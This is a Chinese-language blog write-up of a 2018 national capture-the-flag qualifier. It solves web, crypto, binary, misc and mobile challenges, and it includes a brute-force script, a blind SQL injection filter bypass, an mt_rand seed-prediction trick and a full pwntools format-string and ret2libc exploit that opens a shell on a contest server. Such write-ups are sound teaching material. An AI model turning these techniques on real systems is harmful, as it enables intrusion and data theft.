<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 第三届全国网络空间安全技术大赛(线上初赛) · 信鑫-King's Blog</title><meta name="description" content="第三届全国网络空间安全技术大赛(线上初赛) - Kylin King"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://www.ycjcl.cc/atom.xml" title="信鑫-King's Blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://weibo.com/ycjcl868" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="https://github.com/ycjcl868" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">第三届全国网络空间安全技术大赛(线上初赛)</h1><div class="post-info">Jul 8, 2018</div><div class="post-content"><h1 id="第三届全国网络空间安全技术大赛-线上初赛"><a href="#第三届全国网络空间安全技术大赛-线上初赛" class="headerlink" title="第三届全国网络空间安全技术大赛(线上初赛)"></a>第三届全国网络空间安全技术大赛(线上初赛)</h1><p>##web 1 签到题<br>1.老套路看源码发现是php隐士转换直接 <code>Username=QNKCDZO，password=240610708</code> ，得到下一个地址<a href="http://117.34.111.15:84/json.php" target="_blank" rel="noopener">http://117.34.111.15:84/json.php</a><br>2.继续右键看源码<br><img src="http://i.imgur.com/uzIyIK5.png" alt=""></p>
<p>3.又是弱类型</p>
<p><img src="http://i2.muimg.com/567571/0e5913ddf22456cc.png" alt=""></p>
<h1 id="Web2-抽抽奖"><a href="#Web2-抽抽奖" class="headerlink" title="Web2 抽抽奖"></a>Web2 抽抽奖</h1><blockquote>
<p>抽奖呗 <a href="http://117.34.111.15/" target="_blank" rel="noopener">http://117.34.111.15/</a></p>
</blockquote>
<p>看到 <code>jQuery.js</code> 有点异常，打开源码，<a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html" target="_blank" rel="noopener">解码</a>得到以下代码：</p>
<p><img src="http://i4.buimg.com/567571/cc3bda86da260b92.png" alt=""></p>
<p>然后直接在控制台输入 <code>getFlag</code>，得到 <code>flag</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">window</span>.getFlag=<span class="function"><span class="keyword">function</span>(<span class="params">text</span>)</span>&#123;  <span class="keyword">if</span>(text==<span class="string">'1'</span>)&#123;      alert(<span class="string">"你最厉害啦!可惜没flag"</span>)  &#125;   <span class="keyword">if</span>(text==<span class="string">'2'</span>)&#123;      alert(<span class="string">"你太厉害了,竟然是二等奖"</span>)   &#125;   <span class="keyword">if</span>(text==<span class="string">'3'</span>)&#123;      alert(<span class="string">"你好厉害,三等奖啊"</span>)  &#125;   <span class="keyword">if</span>(text==<span class="string">'flag'</span>)&#123;       alert(<span class="string">"flag&#123;951c712ac2c3e57053c43d80c0a9e543&#125;"</span>)     &#125;   <span class="keyword">if</span>(text==<span class="string">'0'</span>)&#123;      alert(<span class="string">"再来一次吧"</span>)  &#125; &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h1 id="Web3-继续抽"><a href="#Web3-继续抽" class="headerlink" title="Web3 继续抽"></a>Web3 继续抽</h1><p>查看源代码，看代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">'get.php?token='</span> + $(<span class="string">"#token"</span>).val() + <span class="string">"&amp;id="</span> + encode(md5(jsctf2)), <span class="function"><span class="keyword">function</span>(<span class="params">jsctf3</span>) </span>&#123;</span><br><span class="line">    alert(jsctf3[<span class="string">'text'</span>])</span><br><span class="line">&#125;, <span class="string">'json'</span>);</span><br></pre></td></tr></table></figure>
<p>于是构造请求 <code>&#39;http://117.34.111.15:81/get.php?token=&#39;+token+&#39;&amp;id=&#39;+id</code> ，试了下 <code>encode(md5(&#39;1&#39;))、encode(md5(&#39;2&#39;))、encode(md5(&#39;3&#39;))</code>，均没出来 <code>flag</code> ，于是写了 <code>python</code> 脚本，跑构造好的字典</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyquery</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">'zd.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file.readlines():</span><br><span class="line">    id = line.strip(<span class="string">'\n'</span>)</span><br><span class="line">    url = <span class="string">'http://117.34.111.15:81/'</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch, br'</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">        <span class="string">'Cache-Control'</span>:<span class="string">'max-age=0'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B150 MicroMessenger/6.5.1 NetType/WIFI Language/zh_CN'</span>,</span><br><span class="line">        <span class="string">'Upgrade-Insecure-Requests'</span>:<span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>:<span class="string">'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4'</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s = requests.Session()</span><br><span class="line"></span><br><span class="line">    r = s.get(url=url,headers=headers).text</span><br><span class="line"></span><br><span class="line">    c = pyquery.PyQuery(r)</span><br><span class="line"></span><br><span class="line">    token = c(<span class="string">'#token'</span>).val()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    url2 = <span class="string">'http://117.34.111.15:81/get.php?token='</span>+token+<span class="string">'&amp;id='</span>+id</span><br><span class="line"></span><br><span class="line">    r2 = s.get(url=url2,headers=headers)</span><br><span class="line">    str = r2.text</span><br><span class="line">    <span class="keyword">print</span> str.decode(<span class="string">'unicode_escape'</span>).encode(<span class="string">'utf-8'</span>), id</span><br></pre></td></tr></table></figure>
<p>于是跑出 <code>flag</code>，也就是当 <code>encode(md5(&#39;147&#39;))</code> 时，</p>
<p><img src="http://i1.piimg.com/567571/08ff7a791dc14523.jpg" alt=""></p>
<h1 id="Web4-Wrong"><a href="#Web4-Wrong" class="headerlink" title="Web4  Wrong"></a>Web4  Wrong</h1><p>找到这个 <code>.index.php.swp</code> 通过恢复文件 <code>vim -r index.php</code> 得到下面源码</p>
<p><img src="http://i2.muimg.com/567571/911b3dc41578b3b1.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_password</span><span class="params">($pw_length =  <span class="number">10</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$randpwd = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $pw_length; $i++)</span><br><span class="line">&#123;</span><br><span class="line">$randpwd .= chr(mt_rand(<span class="number">33</span>, <span class="number">126</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $randpwd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">mt_srand(time());</span><br><span class="line">$pwd=create_password();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($pwd==$_GET[<span class="string">'pwd'</span>])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>($_SESSION[<span class="string">'userLogin'</span>]==$_GET[<span class="string">'login'</span>])</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Good job, you get the key"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="string">"Wrong!"</span>;&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'userLogin'</span>]=create_password(<span class="number">32</span>).rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过小小的审计得到思路 把cookie删掉<br>就可以过第二个 <code>if($_SESSION[&#39;userLogin&#39;]==$_GET[&#39;login&#39;])</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_password</span><span class="params">($pw_length =  <span class="number">10</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $randpwd = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $pw_length; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $randpwd .= chr(mt_rand(<span class="number">33</span>, <span class="number">126</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $randpwd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">1492307701</span>);</span><br><span class="line">$pwd=create_password();</span><br><span class="line">var_dump($pwd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过下面脚本得到一个随后的时间戳，用 <code>burp</code> 不断发包，等到时间到了设置的时间戳就会得到 <code>flag</code></p>
<p>##web4 so easy:<br>访问:<code>http://117.34.111.15:89/</code> 得到部分源码</p>
<p><img src="http://i.imgur.com/2MLmzn8.png" alt=""></p>
<ol>
<li>waf拦截了<code>逗号、空格、and、union</code>等关键字，但是没有过滤<code>mid、ascii、from等关键字</code>，因为过滤了and，那就利用Mysql的位运算<code>0&#39;^1^&#39;1</code>结果为0，拼接sql语句为<code>select role from  user where username =&#39;0&#39;^1^0</code>成功得到查询到admin的role</li>
<li><p>利用bool型盲注进行注入，用()代替空格，用from 1 代替,写一个脚本跑一下，得到密码: <code>37b1d2f04f594bfffc826fd69e389688</code></p>
<p> <img src="http://i.imgur.com/CWEovXF.png" alt=""></p>
</li>
<li><p>利用注入的密码去登录</p>
<p> <img src="http://i.imgur.com/g6oxtms.png" alt=""></p>
</li>
<li><p>这里直接用mysql字符问题解决，成功获取flag</p>
<p> <img src="http://i.imgur.com/5R2rXH0.png" alt=""></p>
</li>
</ol>
<p>##web5 just a test：<br>1.随手发现注入<br>直接sqlmap跑，开始一直在跑test1库，跑到后台管理账号密码，后台没有</p>
<p>2.列了一下数据库，看到了test库，想到题目才知道入坑了，但是跑不出来列得到列名为fl@g，尝试去跑内容，但是段都列不了，用尝试手工，成功获取到fl@g的列为f1ag(ps:坑就在@，mysql会把g当做变量，没办法查询，用反引号扩起来就好了)</p>
<p><img src="http://i.imgur.com/ClmCCbs.png" alt=""></p>
<p><img src="http://i.imgur.com/Xkcyt7V.png" alt=""></p>
<p>因为extractvalue有32位的限制，直接把f1ag加在sqlmap的列的目录里面，直接dump吧</p>
<p><img src="http://i.imgur.com/pkyjJZN.png" alt=""></p>
<h1 id="Crypto1-签到"><a href="#Crypto1-签到" class="headerlink" title="Crypto1 签到"></a>Crypto1 签到</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ~ <span class="built_in">echo</span> <span class="string">"ZmxhZ3tXZWlTdW9GeXVfQmllTGFuZ30="</span> | base64 -D</span><br><span class="line">flag&#123;WeiSuoFyu_BieLang&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Crypt2-200"><a href="#Crypt2-200" class="headerlink" title="Crypt2 200"></a>Crypt2 200</h1><p>小强不小心截获了两个老外同服务器的加密通信数据，看看他们在说些什么。。。</p>
<p>在通信流量中能找到 N 和E，猜测密文都是一样的，用共模攻击<br>得到 <code>flag{flag{Hc0mm0nModulusR$AH}}</code></p>
<h1 id="Bin1-Now"><a href="#Bin1-Now" class="headerlink" title="Bin1 Now"></a>Bin1 Now</h1><p>程序使用自修改代码、第三方标准库等手段，影响静态分析。程序输入在<code>00402047</code>处，接着在<code>004020E9</code>检查长度是否为9。通过<code>004038F0</code>输出调用定位到关键输出在<code>00402490</code>函数中，此控制此函数关键之跳的<code>dword_446184</code>是在<code>402640</code>函数中确定的。细看下此函数，发现关键算法也在此处，将输入和<code>xmmword_43AC00</code>分别运算后进行比较，因为<code>xmmword_43AC00</code>的计算结果为定值，整理下即可反算出输入<code>536724689</code>，代码如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">check = [<span class="number">0x0b</span>,<span class="number">0x06</span>,<span class="number">0x15</span>,<span class="number">0x0b</span>,<span class="number">0x04</span>,<span class="number">0x0e</span>,<span class="number">0x16</span>,<span class="number">0x10</span>,<span class="number">0x31</span>]</span><br><span class="line">input = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">	s2 = check[<span class="number">3</span>*i+<span class="number">1</span>]/<span class="number">2</span></span><br><span class="line">	s1 = check[<span class="number">3</span>*i]<span class="number">-2</span>*s2</span><br><span class="line">	s3 = check[<span class="number">3</span>*i+<span class="number">2</span>]<span class="number">-5</span>*s2</span><br><span class="line">	input += chr(s1+<span class="number">0x30</span>)+chr(s2+<span class="number">0x30</span>)+chr(s3+<span class="number">0x30</span>)</span><br><span class="line"><span class="keyword">print</span> input</span><br></pre></td></tr></table></figure>
<p>将输入代入程序即可得到后面一部分的flag：<code>0IdWan9}</code><br>根据题目提示，终于在文件的详细资料里找到一串base64串，解之得到<code>flag{aoot@mail:</code>。<br>所以最终flag:<code>flag{aoot@mail:0IdWan9}</code>。</p>
<h1 id="Bin2-Magical-Box"><a href="#Bin2-Magical-Box" class="headerlink" title="Bin2 Magical Box"></a>Bin2 Magical Box</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"117.34.80.134"</span>, <span class="number">7777</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"you?\n"</span>)</span><br><span class="line">    payload = <span class="string">"aa"</span> + p32(addr) + <span class="string">"%5$s"</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"login!aa"</span>)</span><br><span class="line">    r.recv(<span class="number">4</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    data = data.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_canary</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"you?\n"</span>)</span><br><span class="line">    payload = <span class="string">"%7$p"</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"login!"</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    data = data.replace(<span class="string">"\n"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">canary = int(leak_canary(),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] canary:&#123;0&#125;"</span>.format(hex(canary))</span><br><span class="line"></span><br><span class="line">printf_got = <span class="number">0x0804B010</span></span><br><span class="line">leak_data = leak(printf_got)</span><br><span class="line">printf_addr = u32(leak_data[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">fflush_addr = u32(leak_data[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] printf:&#123;0&#125;"</span>.format(hex(printf_addr))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] fflush:&#123;0&#125;"</span>.format(hex(fflush_addr))</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">"printf"</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">sh_addr = next(libc.search(<span class="string">"/bin/sh"</span>)) + libc_base</span><br><span class="line"><span class="comment">#attach()</span></span><br><span class="line">r.recvuntil(<span class="string">"you?\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"admin2017"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"commands."</span>)</span><br><span class="line">r.sendline(<span class="string">"add"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"APP/Site: "</span>)</span><br><span class="line">r.sendline(<span class="string">"a"</span>*<span class="number">0x31</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Username: "</span>)</span><br><span class="line">r.sendline(<span class="string">"b"</span>*<span class="number">0x1d</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Password: "</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">30</span></span><br><span class="line">payload += p32(canary)</span><br><span class="line">payload += <span class="string">"a"</span>*<span class="number">0xc</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(sh_addr)</span><br><span class="line">payload += p32(sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="Misc1-一维码"><a href="#Misc1-一维码" class="headerlink" title="Misc1 一维码"></a>Misc1 一维码</h1><p>首先，从图片中进行 <code>LSB</code> 提取，能获取一个 <code>ELF</code> 文件。</p>
<p><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/76519164-file_1492348397533_13ebf.png" alt=""></p>
<p>又因为之前扫码得知一个针对可执行文件的隐写工具hydan，通过这个就能得到flag了。</p>
<h1 id="Misc3乾坤"><a href="#Misc3乾坤" class="headerlink" title="Misc3乾坤"></a>Misc3乾坤</h1><p>在数据包导出http对象，里面有2个zip包（在linux下可以看得清楚），解压后一个是flag.exe另一个是encode.py，encode.py是把flag进行多次b64替换并做处理，而flag.exe在最后面附带了密文，编写decode.py即可</p>
<p><code>flag{n1_hEn_baNg_0}</code></p>
<h1 id="Misc4-轨迹"><a href="#Misc4-轨迹" class="headerlink" title="Misc4 轨迹"></a>Misc4 轨迹</h1><p>USB流量捕获与解析，之前在360安全客看到过类似的题目，我记得好像还是XNUCA Misc专场的题。猜测又是画flag了，祭出我的神器！（当然也不是我的是github上的大神写的）<a href="https://github.com/gloxec/UsbMiceDataHacker" target="_blank" rel="noopener">https://github.com/gloxec/UsbMiceDataHacker</a></p>
<p><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/26696594-file_1492349034373_3a9b.png" alt=""></p>
<p>经过一番艰难的识别。。。。</p>
<h1 id="Misc5-种棵树吧"><a href="#Misc5-种棵树吧" class="headerlink" title="Misc5 种棵树吧"></a>Misc5 种棵树吧</h1><p>对第一个图片斌walk 得到一个gif，加上头，能得到 In-order <code>{RY!heHVaL-goAI{dxj_GpnUw8}kzu*Er:s56fFl2i}</code><br>strings 第二个图片得到  Post-order<code>{YR!eVa-gLAoxd_j{pw}8zkUnGuIHh:r65f2lFsEi*}</code><br>二叉树就二叉树吗 …真是的<br>由中序和后序画出二叉树，然后按层次遍历 得到hi!HEReIsYouFLAG:flag{n52V-jPU6d_kx8zw}</p>
<h1 id="Misc6-我们的秘密"><a href="#Misc6-我们的秘密" class="headerlink" title="Misc6 我们的秘密"></a>Misc6 我们的秘密</h1><p>对文件进行<code>binwak secret.zip -e</code>得到一个reame.txt文件，使用明文攻击，得到压缩包密码：3xatu2o17<br>解压后主要有两文件，一个音频，一个视频，音频中解摩尔斯得到CTFSECWAR2017，然后猜测题目的意思，our secret这是一款隐写软件，通过他和之前得到的字符串得到<code>flag{v1de0_c0nc3a1_lala}</code></p>
<p><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/34757794-file_1492350154404_4c6b.png" alt=""></p>
<h1 id="MOBILE1-拯救鲁班七号"><a href="#MOBILE1-拯救鲁班七号" class="headerlink" title="MOBILE1 拯救鲁班七号"></a>MOBILE1 拯救鲁班七号</h1><p>题目对输入的字符串进行简单的变换，每个循环中，首先将当前index指向的相邻两个字符互换，然后将进入一个小循环依次每隔3个互换。加解密时需注意互换的边界。密文为“!S#@A4DF32511@43”，明文为“!@#@ASDF3451123”。<br>加解密代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'!@#@ASDF34511234'</span></span><br><span class="line"><span class="keyword">print</span> len(s)</span><br><span class="line">l = list(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(l) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">    l[i], l[i - <span class="number">1</span>] = l[i - <span class="number">1</span>], l[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>, len(l), <span class="number">4</span>):</span><br><span class="line">        l[j - <span class="number">4</span>], l[j] = l[j], l[j - <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(l)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = 'S!@#@1FD23154A34'</span></span><br><span class="line"><span class="comment"># l = list(s)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(((len(l) &amp; (~<span class="number">1</span>)) - <span class="number">3</span>), <span class="number">0</span>, <span class="number">-2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range((len(l) - <span class="number">1</span>) &amp; (~<span class="number">3</span>), <span class="number">3</span>, <span class="number">-4</span>):</span><br><span class="line">        l[j - <span class="number">4</span>], l[j] = l[j], l[j - <span class="number">4</span>]</span><br><span class="line">    l[i], l[i - <span class="number">1</span>] = l[i - <span class="number">1</span>], l[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(l)</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(l) == s</span><br></pre></td></tr></table></figure>
<h1 id="MOBILE-2-人民的名义-抓捕赵德汉1"><a href="#MOBILE-2-人民的名义-抓捕赵德汉1" class="headerlink" title="MOBILE 2 人民的名义-抓捕赵德汉1"></a>MOBILE 2 人民的名义-抓捕赵德汉1</h1><p>首先从sqlite数据库里取一个字符串，id为2，表为users，取出来字符串为9838e888496bfda98afdbb98a9b9a9d9cdfa29，然后会将输入做一些变换与字符串比较，变换的规则为每个字符的低四位取反并转为十六进制，然后加上高四位与0xe异或。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'9838e888496bfda98afdbb98a9b9a9d9cdfa29'</span></span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>):</span><br><span class="line">    l.append(chr(</span><br><span class="line">        (~int(s[i], <span class="number">16</span>) &amp; <span class="number">0xf</span>) + ((int(s[i + <span class="number">1</span>], <span class="number">16</span>) ^ <span class="number">0xe</span>) &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    ))</span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(l)</span><br></pre></td></tr></table></figure>
<h1 id="MOBILE-3-人民的名义-抓捕赵德汉2"><a href="#MOBILE-3-人民的名义-抓捕赵德汉2" class="headerlink" title="MOBILE 3 人民的名义-抓捕赵德汉2"></a>MOBILE 3 人民的名义-抓捕赵德汉2</h1><p>这个题有两种解法，第一种反编译newClassName.class，里面有个md5：<code>fa3733c647dca53a66cf8df953c2d539</code> ，cmd5上查一下是monkey99就是flag。<br>第二种正统的做法，是反编译CheckPassword.class，发现里面动态加载了一个class，这个class使用aes加密存于ClassEnc文件中，aes密钥的十六进制是<code>bb27630cf264f8567d185008c10c3f96</code> ，把这个ClassEnc文件解密，即可得到newClassName.class文件的内容，后面的步骤同第一个解法</p>
